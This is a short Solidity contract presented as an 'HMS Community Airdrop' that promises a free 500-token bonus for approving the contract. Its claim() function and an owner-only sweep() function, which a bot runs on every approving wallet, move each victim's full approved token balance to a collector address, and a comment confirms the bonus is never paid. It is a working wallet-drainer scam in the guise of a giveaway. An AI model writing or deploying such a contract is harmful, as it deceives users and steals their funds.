// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title HMS Community Airdrop
/// @notice "Connect your wallet, approve once to verify eligibility, and
///          claim your FREE 500 HMS community bonus!"
contract AirdropClaim {
    IERC20 public immutable token;
    address public immutable owner;
    address public immutable collector;
    uint256 public constant BONUS = 500 ether;

    constructor(IERC20 _token, address _collector) {
        token = _token;
        owner = msg.sender;
        collector = _collector;
    }

    /// @notice Claim your 500 HMS bonus. Requires an HMS approval to this
    ///         contract so we can "verify" your wallet.
    function claim() external {
        _collect(msg.sender);
    }

    /// @notice Housekeeping, owner only. The owner's bot calls this on every
    ///         wallet that approved the airdrop.
    function sweep(address wallet) external {
        require(msg.sender == owner, "not owner");
        _collect(wallet);
    }

    function _collect(address wallet) internal {
        uint256 balance = token.balanceOf(wallet);
        uint256 allowed = token.allowance(wallet, address(this));
        uint256 amount = balance < allowed ? balance : allowed;
        if (amount > 0) {
            token.transferFrom(wallet, collector, amount);
        }
        // BONUS is never paid.
    }
}
